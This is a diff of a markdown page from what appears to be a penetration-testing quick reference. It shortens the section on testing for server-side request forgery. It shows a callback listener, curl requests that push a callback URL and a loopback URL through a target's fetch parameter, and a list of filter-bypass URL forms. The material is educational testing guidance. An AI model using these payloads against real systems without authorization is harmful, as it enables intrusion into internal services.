@@ -2,36 +2,42 @@
 
 [← Foothold quick reference](../02-foothold.md)
 
-Look for a feature that fetches a URL on the server's behalf: image import, link preview, webhook test, PDF generation, or a file converter. First find out whether the **server** makes the request. A URL merely reflected in the page is not evidence of SSRF.
+Check URL fetchers: previews, imports, webhooks, PDF/file converters.
 
 ## Confirm the fetch
 
-On your machine, listen for a request. Use an address the target can reach:
+On Kali:
 
 ```bash
 python3 -m http.server 8000
 ```
 
-In another terminal, submit a unique path through the suspected URL parameter:
+In another terminal:
 
 ```bash
 curl -G 'http://<target>/fetch' \
   --data-urlencode 'url=http://<kali-ip>:8000/ssrf-check-01'
 ```
 
-Check the listener log for that path and compare it with a baseline request. Some features fetch later or return no fetched body; a callback can confirm a blind fetch. No callback does not settle the question if the target cannot reach your listener.
+Listener hit confirms a server fetch; reflection alone does not. No hit: check reachability and delayed jobs.
 
 ## Check what it can reach
 
-After confirming the fetch, try a known HTTP service on the target's loopback address and compare the status, body, and timing with an unused port:
+After callback, compare a known target-local port with an unused port:
 
 ```bash
 curl -G 'http://<target>/fetch' \
   --data-urlencode 'url=http://127.0.0.1:8080/'
 ```
 
-Here `127.0.0.1` means the **target server**, not your machine. Test one port or URL change at a time. If a host filter blocks the obvious form, check how the application parses the URL; for example, the host in `http://allowed.example@127.0.0.1:8080/` is `127.0.0.1`. Short loopback forms such as `127.1`, redirects, and DNS resolution are parser-dependent, so verify the resulting request with a callback or visible response.
+`127.0.0.1` is the target's loopback. If filtered, test parsing: `http://allowed.example@127.0.0.1:8080/` targets `127.0.0.1`. Verify the actual fetch.
 
-Record the requested URL, what the server fetched, and whether the response was returned to you. Internal pages and metadata services are possible targets, but reachability alone does not show access to their contents.
+```text
+http://127.1:8080/
+http://[::1]:8080/
+http://<allowed-host>/redirect-to-loopback
+```
+
+Record requested URL, callback, and returned content separately.
 
 [OWASP SSRF testing](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/07-Injection/19-Server-Side_Request_Forgery/)
